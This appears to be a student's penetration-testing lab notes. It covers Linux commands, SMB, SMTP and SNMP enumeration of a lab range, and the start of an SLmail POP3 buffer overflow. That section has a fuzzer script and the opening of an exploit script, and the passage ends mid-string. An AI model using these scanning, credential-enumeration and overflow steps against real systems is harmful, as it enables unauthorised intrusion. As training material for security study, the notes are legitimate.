# Scripts and Commands

## General Purpose Programs

### find
`find` is a recursive search for file names. Its general use is such: `find path -name 
PATTERN`.  An example would be something like this.

```bash
phillip:ScriptsAndCommands$ find ~/scripts -name "*.sh"
/home/phillip/scripts/serverStart.sh
/home/phillip/scripts/dns-enum.sh
/home/phillip/scripts/ScriptsAndCommands/dns-enum.sh
/home/phillip/scripts/ScriptsAndCommands/server-os-disc.sh
/home/phillip/scripts/ScriptsAndCommands/smb-check.sh
/home/phillip/scripts/ScriptsAndCommands/loop-ping.sh
/home/phillip/scripts/serverStop.sh
/home/phillip/scripts/trafficStop.sh
/home/phillip/scripts/trafficStart.sh
phillip:ScriptsAndCommands$ 
```
`find` has many command line optiions to choose from and they can all be found in `man
find` but the most notible is the `-exec` option that allows you to run a command on each 
file that is returned.

```bash
phillip:ScriptsAndCommands$ find ~/scripts -name "*Stop.sh" -exec cat {} \;
#!/bin/bash

sudo service apache2 stop;
sudo service mysql stop;
#!/bin/bash

sudo iptables -A INPUT ! -i lo -p tcp --destination-port 80 -j DROP
phillip:ScriptsAndCommands$ 
```
Notice that the `;` needed to be excaped - `\;`.

### locate
Reads of list of files form a database and prints the paths of the files that match the
users querey.

First you need to update the database with the `updatedb` command. This must be done as
root. Next you can run `locate [OPTION]... PATTERN...` with `PATTERN` handling regular
expressions. 

### Which
`which` will find the path of a given program. for example:

```bash
UNIX:~$ which cat
/bin/cat
UNIX:~$
```

### passwd
`passwd` will allow you to change the password of the current user.

### netstat
`netstat`  - Print network connections, routing tables, interface statistics, masquer‐ade 
connections, and multicast memberships.  A usefull example of how to use `netstat would be

```bash
netstat -antp | grep sshd
```
What is returned will tell you whether or not the ssh service is running. Netstat has
several options.  The ones used in the example above are for

* -a, --all
    * Show  both  listening and non-listening sockets.  With the --interfaces option, show
interfaces that are not up
* -n, --numeric
    * Show numerical addresses instead of trying to determine symbolic host, port or  user
names.
* -p, --program
    * Show the PID and name of the program to which each socket belongs.
* -t, --tcp
    * tells netstat to only pay attention to TCP type connections

an example witout the grep will look like this.

```bash
phillip:ScriptsAndCommands$ sudo netstat -antp
[sudo] password for phillip: 
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:902             0.0.0.0:*               LISTEN      1115/vmware-authdla
tcp        0      0 0.0.0.0:3689            0.0.0.0:*               LISTEN      2484/rhythmbox  
tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      1386/dnsmasq    
tcp6       0      0 :::902                  :::*                    LISTEN      1115/vmware-authdla
tcp6       0      0 :::3689                 :::*                    LISTEN      2484/rhythmbox  
phillip:ScriptsAndCommands$ 
```

This can be ran without Supper User privilages but you won't get as much usful
information.

### service
`service` is a wrapper that runs an `/etc/init.d/SCRIPT` to start, stop, restart, etc. a
service. An example would be something like.

```bash
sudo service ssh start
```
***___NOTE___*** that this must be ran with Supper User privaliges.

There are also a couple of scripts in this reposatory that when ran will start or stop
both the Apache2 and the MySQL servercies.  Those scripts are
[serverStart.sh](serverStart.sh) and [serverStop.sh](serverStop.sh).

### update-rc.d
`update-rc.d` allows you to alter the boot precistance of services.  For example if you
wanted to have your SSH service enabled on boot you could use:

```bash
update-rc.d ssh enable
```
This program installs and removes System-V style init script links so it is possible to
change the percistance in a single state.  Valid states are [0|1|2|3|4|5|6]. Usage would
be:

```bash
update-rc.d apache2 enable 2
```

### wget
`wget` will download the target at the given url. For example:

```bash
phillip:scripts$ wget www.cisco.com
--2017-09-01 14:09:43--  http://www.cisco.com/
Resolving www.cisco.com (www.cisco.com)... 2600:1402:a:199::b33, 2600:1402:a:195::b33, 23.67.121.35
Connecting to www.cisco.com (www.cisco.com)|2600:1402:a:199::b33|:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://www.cisco.com/ [following]
--2017-09-01 14:09:43--  https://www.cisco.com/
Connecting to www.cisco.com (www.cisco.com)|2600:1402:a:199::b33|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.html’

index.html                  [ <=>                          ]  60.44K  --.-KB/s    in 0.09s   

2017-09-01 14:09:44 (644 KB/s) - ‘index.html’ saved [61886]

phillip:scripts$ ls
index.html  ScriptsAndCommands
phillip:scripts$ vim
```
If the target url is a website then the downloded file will be the index.html like shown
above.  It can also be used to download .pdfs, .jpegs, etc.

### host
`host` is a DNS lookup utility. `host` is a simple utility for performing DNS lookups. It
is normally used to convert names to IP addresses and vice versa. When no arguments or
options are given, host prints a short summary of its command line arguments and options.
A quick example woudl be:

```bash
phillip:scripts$ host www.cisco.com
www.cisco.com is an alias for www.cisco.com.akadns.net.
www.cisco.com.akadns.net is an alias for wwwds.cisco.com.edgekey.net.
wwwds.cisco.com.edgekey.net is an alias for wwwds.cisco.com.edgekey.net.globalredir.akadns.net.
wwwds.cisco.com.edgekey.net.globalredir.akadns.net is an alias for e2867.dsca.akamaiedge.net.
e2867.dsca.akamaiedge.net has address 23.67.121.35
e2867.dsca.akamaiedge.net has IPv6 address 2600:1402:a:199::b33
e2867.dsca.akamaiedge.net has IPv6 address 2600:1402:a:195::b33
phillip:scripts$
```

### ping
`ping` sends ICMP ECHO_REQUESTs to the specified IP address.  Ping will then tell you if
you receive a responce, how long it took, and the Time To Live (TTL). A quick example
would be:

```bash
phillip:scripts$ ping 23.67.121.35
PING 23.67.121.35 (23.67.121.35) 56(84) bytes of data.
64 bytes from 23.67.121.35: icmp_seq=1 ttl=52 time=450 ms
64 bytes from 23.67.121.35: icmp_seq=2 ttl=52 time=167 ms
64 bytes from 23.67.121.35: icmp_seq=3 ttl=52 time=292 ms
64 bytes from 23.67.121.35: icmp_seq=4 ttl=52 time=70.0 ms
^C
--- 23.67.121.35 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3001ms
rtt min/avg/max/mdev = 70.056/245.238/450.883/142.461 ms
```

Using the `-c NUMBER` option will ping to stop after ___***NUMBER***___ 
packets sent.

### A Couple of Ping Scripts
There are two ping scripts in this reposatory and both do the same thing.  Bot are ment
to loop through a series of IP addresses and print the ones that respond to ICMP requests.
The first one [loop-ping.sh](loop-ping.sh) is a bash script that has the IP range hard
coded into it.  In the future it will take the IP range as a command line argument.

The second one [loop-ping.py](loop-ping.py) does the same as the last but is written in
python.  It also has the IP range hard codded into it and will hopefully be fixed in the
future.







## Active Info Gathering





### SMB Enumeration

#### Scanning for the NetBIOS Service
The SMB netbios service lives on ports `139` and `445`.  You can scan servers looking for
netbios services with nmap with something similar to this.

```bash
nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254 --open
```
* `-v` tells nmap to be verbose
* `-p` tells nmap to only check ports 139 and 445
* `-oG` tells nmap to output the data in grepable format to file `smb.txt`
* `10.111.1.1-254` is the IP range that will be scaned.
* `--open` tells nmap to only report on IPs that it found with open netbios ports.

A more specialized tool for scanning for netbios would be to use someting like `nbtscan`.

```bash
nbtscan -r 10.11.1.0/24
```
```bahs
nbtscan 10.11.1.1-254
```
* `-r` tels nbtscan to use local port 137 for scans. Win95 boxes respond to this only.

The ouput of this command might look something like this.
```
Doing NBT name scan for addresses from 10.11.1.1-254

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.11.1.5        ALICE            <server>  ALICE            00:50:56:89:25:59
10.11.1.24       PAYDAY           <server>  PAYDAY           00:00:00:00:00:00
10.11.1.31       RALPH            <server>  USER67           00:50:56:89:17:75
10.11.1.22       BARRY            <server>  BARRY            00:00:00:00:00:00
10.11.1.115      TOPHAT           <server>  TOPHAT           00:00:00:00:00:00
10.11.1.128      DJ               <server>  DJ               00:50:56:89:45:48
10.11.1.73       GAMMA            <server>  <unknown>        00:50:56:89:21:c2
10.11.1.136      SUFFERANCE       <server>  SUFFERANCE       00:00:00:00:00:00
10.11.1.202      ORACLE           <server>  ORACLE           00:50:56:89:69:ce
10.11.1.229      MAIL             <server>  MAIL             00:50:56:89:5d:07
10.11.1.227      JD               <server>  JD               00:50:56:89:1b:3b
10.11.1.145      HELPDESK         <server>  <unknown>        00:50:56:89:7e:40
10.11.1.220      MASTER           <server>  <unknown>        00:50:56:89:31:e1
10.11.1.221      SLAVE            <server>  <unknown>        00:50:56:89:34:54
10.11.1.230      KEVIN            <server>  <unknown>        00:50:56:89:32:45
10.11.1.218      OBSERVER         <server>  <unknown>        00:50:56:89:4b:13
10.11.1.223      JEFF             <server>  <unknown>        00:50:56:89:03:d2
```

#### Null Session Enumeration

One tool you can use for null session enumeration is `rpcclient`

```bash
rpcclient -U "" ipa.ipa.ipa.ipa
```
* `-U ""` signs in with the user name of an empty string
* `ipa.ipa.ipa.ipa`  IP address of the target server.

Once loged in to the null session u can use commands such as

* `srvinf0` Helps identify the OS version of machine.
* `enumdomusers` Defines a list of user names on the server.
* `getdompwinfo` Displays the SMB password policy.

Many other can be found in `man rpcclient`

Another usefull tool to use to enumerate null sessions is `enum4linux`
```bash
enum4linux -h
```
* `-h` Will display the help screen and give you all the options for `enum4linux`.
```bash
enum4linux -v ipa.ipa.ipa.ipa > text.txt
```
* `-v` Tells enum4linux to be verbose
* `> text.txt` redirects output to the the file text.txt

#### Nmap SMB NSE Scripts
Another way to scan for smb servers is with the nmap scripts.  You can list all the
scripts using
```bash
ls -Al /usr/share/nmap/scripts | grep "smb"
-rw-r--r-- 1 root root 45163 Jun 17 20:04 smb-brute.nse
-rw-r--r-- 1 root root  5282 Jun 17 20:04 smb-double-pulsar-backdoor.nse
-rw-r--r-- 1 root root  4846 Jun 17 20:04 smb-enum-domains.nse
-rw-r--r-- 1 root root  5931 Jun 17 20:04 smb-enum-groups.nse
-rw-r--r-- 1 root root  8045 Jun 17 20:04 smb-enum-processes.nse
-rw-r--r-- 1 root root 12057 Jun 17 20:04 smb-enum-sessions.nse
-rw-r--r-- 1 root root  6923 Jun 17 20:04 smb-enum-shares.nse
-rw-r--r-- 1 root root 12531 Jun 17 20:04 smb-enum-users.nse
-rw-r--r-- 1 root root  1706 Jun 17 20:04 smb-flood.nse
-rw-r--r-- 1 root root  7388 Jun 17 20:04 smb-ls.nse
-rw-r--r-- 1 root root  8792 Jun 17 20:04 smb-mbenum.nse
-rw-r--r-- 1 root root  8041 Jun 17 20:04 smb-os-discovery.nse
-rw-r--r-- 1 root root  5083 Jun 17 20:04 smb-print-text.nse
-rw-r--r-- 1 root root 63595 Jun 17 20:04 smb-psexec.nse
-rw-r--r-- 1 root root  5190 Jun 17 20:04 smb-security-mode.nse
-rw-r--r-- 1 root root  2424 Jun 17 20:04 smb-server-stats.nse
-rw-r--r-- 1 root root 14150 Jun 17 20:04 smb-system-info.nse
-rw-r--r-- 1 root root  1536 Jun 17 20:04 smbv2-enabled.nse
-rw-r--r-- 1 root root  7586 Jun 17 20:04 smb-vuln-conficker.nse
-rw-r--r-- 1 root root  6494 Jun 17 20:04 smb-vuln-cve2009-3103.nse
-rw-r--r-- 1 root root 23153 Jun 17 20:04 smb-vuln-cve-2017-7494.nse
-rw-r--r-- 1 root root  6618 Jun 17 20:04 smb-vuln-ms06-025.nse
-rw-r--r-- 1 root root  5444 Jun 17 20:04 smb-vuln-ms07-029.nse
-rw-r--r-- 1 root root  5778 Jun 17 20:04 smb-vuln-ms08-067.nse
-rw-r--r-- 1 root root  5620 Jun 17 20:04 smb-vuln-ms10-054.nse
-rw-r--r-- 1 root root  7322 Jun 17 20:04 smb-vuln-ms10-061.nse
-rw-r--r-- 1 root root  6939 Jun 17 20:04 smb-vuln-ms17-010.nse
-rw-r--r-- 1 root root  4522 Jun 17 20:04 smb-vuln-regsvc-dos.nse
```

If you wanted to enumerate all the users on a server using the SMB protocal you could use
`nmap` with the script `smb-enum-users` script like so:

```bash
nmap -p 139,445 --script smb-enum-users ipa.ipa.ipa.ipa
```
* `-p` Tells nmap which ports to scan. In this case ports `139,445`.
* `--script` Tells nmap you want to use the script `smb-enum-users`.
* `ipa.ipa.ipa.ipa` would be the IP address.

Another usefull script to use the nmap when targeting SMB is the `smb-os-discovery` which
should be self explanatory

```bash
nmap -p 139,445 --script=smb-os-discovery ipa.ipa.ipa.ipa
```
or
```bash
nmap -p 139,445 --script smb-os-discovery ipa.ipa.ipa.ipa
```
Most of the time you will not know what the script does and may need help in understanding
it. For that you will use the `-script-help` option.

```bash
root@kali:~# nmap -script-help smb-vuln-ms17-010.nse

Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-05 11:59 EDT

smb-vuln-ms17-010
Categories: vuln safe
https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html
  Attempts to detect if a Microsoft SMBv1 server is vulnerable to a remote code
   execution vulnerability (ms17-010). 

  The script connects to the $IPC tree, executes a transaction on FID 0 and
   checks if the error "STATUS_INSUFF_SERVER_RESOURCES" is returned to
   determine if the target is not patched against ms17-010. Additionally it checks
   for known error codes returned by patched systems.

  Tested on Windows XP, 2003, 7, 8, 8.1, 10, 2008, 2012 and 2016.

  References:
  * https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
  * https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
  * https://msdn.microsoft.com/en-us/library/ee441489.aspx
  * https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb 
  * https://github.com/cldrn/nmap-nse-scripts/wiki/Notes-about-smb-vuln-ms17-010
root@kali:~# 
```
Where previously you could run a single script `smb-check-vuln` to look for all the known
vulnarabilities with the smb protocal, they have now been split into their own scripts.
You can still achieve the same results by running.
```bash
nmap -p 139,445 --script vuln ipa.ipa.ipa.ipa
```
All of the vularability scripts have been groped into section named `vuln` so running
`--script vuln` will run all of the vuln scripts (Not sure if it runs all the vuln
scripts or just the smb-vuln scripts).


### SMTP Enumeration

Mail servers running the SMTP protocal can sometimes be verbose and give an attacker
information that can aid them in attacking the rest of the system.  A simple way to check
for servers running the SMTP protocal (TCP port 25) would be to use `nmap`.
```bash
nmap -v -p 25 ipa.ipa.ipa.ipa-range --open -oG output.txt
```
* `-v` Be verbose
* `-p` Scan port ?
* `--open` Only report open ports
* `-oG` Grepable output to file output.txt

From here you can grep out of of the indipendent IPs with a command like.
```bash
grep "Host: " output.txt | cut -d " " -f 2 | sort -u > tempIPs.txt
```
Next netcat into each of these servers and try the `VRFY` command along with a user name
to see if the server is vulerable to this type of command.  If you get a response then
you can try and enumerate through a list of usernames you suspect are on that server.  If
not then you disconnect and move on to the next IP.

### SNMP Enumeration

#### Scanning for SNMP
The simplest way to scan for the SNMP protocal will again be `namp` but note that SNMP
lives on UDP port 161.
```bash
nmap -sU --open -p 161 ip.ip.ip.ip-range -oG mega-snmp.txt
```
* `-sU` Tell nmap to use UDP
* `--open` Only report open ports.
* `-p` Scan ports 161
* `-oG` Grepable output to file mega-snmp.txt
* `ip.ip.ip.ip-range` Range of IP addresses to scan

You can also use the tool `onesixtyone`.  Its best us create a list of community strings
in a file that are used to enumerate the IP addressees.  for example:
```bash
root@kali:~# cat Research/comunity.txt 
public
private
manager
root@kali:~# 
```
You might also want to create a list of IP addresses for the tool to use. For example:
```bash
for ip in $(seq 1 254); do echo "10.11.1.$ip" > tempIP.txt; done
```
You can then run the tool which will check each of the IPs against the comunity strings
you porvide it.
```bash
onesixtyone -c comunity.txt -i tempIP.txt
```
This will return a list of all the IPs that responded to one of the community strings
along with the string that it responded to.

#### Windows SNMP Enumeration Example
MIB values correspond to specific Microsoft Windows SNMP parameters. A list of important
ones are:

| MIB Value | Parameter |
|:---------:|:---------:|
| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |

You can use snmpwalk to explore these MIB trees:
```bash
snmpwalk -c public -v 1 ip.ip.ip.ip
```
* `-c` Use the community string `public`
* `-v` describes the protocal version to use [1|2c|3]

This will traverse the whole tree which is probable what you don't want.  Instead you can
start from one of the mib values above in the table like so:
```bash
snmpwalk -c public -v 1 ip.ip.ip.ip 1.3.6.1.2.1.25.4.2.1.2
```
This will list all of the running processes on the system.

## Vulnerability Scanning


## Buffer Overflows

The first thing you want to do is try and fuzz an input to the program. In the case of the
SLmail program we fuzzed the `PASS` input from the command line.  we used the simple Python
program [pop3-pass-fuzz.py](bufferOverflow/pop3-pass-fuzz.py) which can be seen
below

```python
#!/usr/bin/python

import socket

buff = ["A"]
counter = 100 

while len(buff) <= 30: 
   buff.append("A"*counter)
   counter+=200

for string in buff:
   print("Fussing PASS with %s bytes" % len(string))
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect( ("10.11.14.166",110) )
   print(s.recv(1024))
   s.send("USER test\r\n")
   print(s.recv(1024))
   passw = "PASS " + string + "\r\n"
   s.send(passw)
   s.send("QUIT\r\n")
   s.close()
```
Just running this from the command line won't tell you anything by itself.  The SLmail
program is multithreaded and will only crash the thread that was created to handle this
instance of comunication.

You will need to be watching the SLmail progam in a debugger to see the thread fail.  

After you see that you can over write the EIP you need to find what the offset is from the
beginning of the buffer to where the return address is.  You can do this by changing the
fuzzing program to send a single unique string as the input using the Metasploit program
`pattern_create.rb`

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
```
* `-l` Tells pattern_create to create a string of unique characters of length 2700
characters

This will create a unique string similare to this:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9
```

pulg this into the exploit python code
[SLmail-pop3.py](bufferOverflow/SLmail-pop3.py)and re-run it.

```python
#!/usr/bin/python

import socket

buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1C